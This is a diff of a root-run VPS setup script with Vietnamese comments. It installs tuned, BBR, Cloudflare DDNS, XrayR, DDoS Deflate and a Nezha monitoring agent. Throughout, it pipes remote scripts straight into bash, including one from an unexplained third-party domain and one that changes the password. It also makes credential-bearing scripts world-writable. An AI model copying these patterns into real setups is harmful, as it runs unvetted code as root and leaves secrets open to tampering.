@@ -6,92 +6,76 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-# Update and install required packages
-sudo apt update -y && sudo apt upgrade -y && sudo apt install -y net-tools grep gawk sed coreutils tuned 
+# Cập nhật và cài đặt các gói cần thiết
+sudo apt update -y && sudo apt upgrade -y
+sudo apt install -y net-tools grep gawk sed coreutils tuned
 
-sudo systemctl enable tuned && sudo systemctl start tuned && sudo tuned-adm profile throughput-performance
+# Kích hoạt và bắt đầu dịch vụ tuned với cấu hình throughput-performance
+sudo systemctl enable tuned
+sudo systemctl start tuned
+sudo tuned-adm profile throughput-performance
 
+# Thay đổi mật khẩu qua script từ GitHub
+bash <(curl -Ls https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/change-pass.sh)
 
-bash <(curl -Ls  https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/change-pass.sh)
-bash <(curl -Ls  https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/crontab2.sh)
+# Thiết lập crontab từ GitHub
+bash <(curl -Ls https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/crontab2.sh)
 
+# Chạy script chống DDoS
 bash <(curl -s https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/anti-ddos-ipv4.sh)
 
-
-# add bbr 
+# Cài đặt BBR để tối ưu mạng
 wget sh.alhttdw.cn/d11.sh && bash d11.sh
 
-
-# dowload cloudflare-ddns
+# Cài đặt và cấu hình Cloudflare DDNS
 sudo snap refresh && sudo snap install cloudflare-ddns
-# config cloudflare-ddns
-echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u a.dautay.xyz -4 $(curl ifconfig.me) >> /root/ipcf.log' > /root/cloudflare-update.sh && sudo chmod 777 /root/cloudflare-update.sh
+echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u a.dautay.xyz -4 $(curl ifconfig.me) >> /root/ipcf.log' > /root/cloudflare-update.sh
+sudo chmod 777 /root/cloudflare-update.sh
 
-
-
-echo '#!/bin/bash
-
-# Domain cần ping
+# Tạo script kiểm tra ping và cập nhật DDNS nếu không ping được
+cat << 'EOF' > /root/check-update.sh
+#!/bin/bash
 DOMAIN="c.dautay.xyz"
-
-# Ping domain với 1 gói và kiểm tra kết quả
 ping -c 1 "$DOMAIN" > /dev/null 2>&1
-
-# Nếu ping không thành công, chạy script cloudflare-update.sh
 if [ $? -ne 0 ]; then
   echo "Không thể ping được $DOMAIN. Đang chạy cloudflare-update.sh..."
   /root/cloudflare-update.sh
 else
   echo "Ping $DOMAIN thành công!"
 fi
-' > check-update.sh
-
+EOF
 sudo chmod 777 /root/check-update.sh
 
-
-# Cài xrayr 
-bash <(curl -Ls  https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/xrayr1.sh)
-
-# Đường dẫn tới tệp cấu hình XrayR
+# Cài đặt XrayR và cập nhật cấu hình
+bash <(curl -Ls https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/xrayr1.sh)
 config_file="/etc/XrayR/config.yml"
-
-# Xóa nội dung của tệp cấu hình
 echo -n "" > "$config_file"
-
-# Lấy nội dung từ URL và thêm vào tệp cấu hình
 curl -sSfL "https://raw.githubusercontent.com/Phamtuananhh2k5/xray/refs/heads/main/code_xrayr_az.txt" >> "$config_file"
-
-# Kết thúc thông báo
 echo "Nội dung của $config_file đã được cập nhật từ URL."
 xrayr restart
-clear
+
+# Gỡ cài đặt và cài lại công cụ DDoS Deflate
 /root/ddos-deflate-master/uninstall.sh
-rm -rf /usr/local/ddos
-rm /usr/local/sbin/ddos
-rm /etc/cron.d/ddos
+rm -rf /usr/local/ddos /usr/local/sbin/ddos /etc/cron.d/ddos
+sudo apt install -y dnsutils net-tools tcpdump dsniff grepcidr
+wget https://github.com/jgmdev/ddos-deflate/archive/master.zip -O ddos.zip
+unzip ddos.zip && cd ddos-deflate-master && ./install.sh
+curl -o /etc/ddos/ddos.conf https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/ddos.conf
+service ddos restart
 
-sudo apt install dnsutils && sudo apt-get install net-tools && sudo apt-get install tcpdump && sudo apt-get install dsniff -y && sudo apt install grepcidr	
-
-wget https://github.com/jgmdev/ddos-deflate/archive/master.zip -O ddos.zip && unzip ddos.zip && cd ddos-deflate-master && ./install.sh	
-
-curl -o /etc/ddos/ddos.conf https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/ddos.conf && service ddos restart	
-
-clear
-
-# add vps lên vps.dualeovpn.net
-bash <(curl -Ls  https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/add-Nezha.sh)
+# Thêm VPS lên hệ thống giám sát VPS
+bash <(curl -Ls https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/add-Nezha.sh)
 
 # Thực hiện cập nhật DDNS ngay lập tức
 /root/check-update.sh
 
-
-clear 
+# Hiển thị thông báo hoàn tất
+clear
 echo -e "\e[30;48;5;82mCài xong AZ\e[0m Lên WEB"
-#!/bin/bash
-# khởi động lại 
+
+# Hỏi người dùng có muốn khởi động lại VPS không
 echo "Bạn có muốn khởi động lại VPS không? (nhấn Enter để đồng ý, n để hủy)"
 read answer
-
 if [ -z "$answer" ] || [ "$answer" == "y" ]; then
     echo "Khởi động lại VPS..."
     sudo reboot
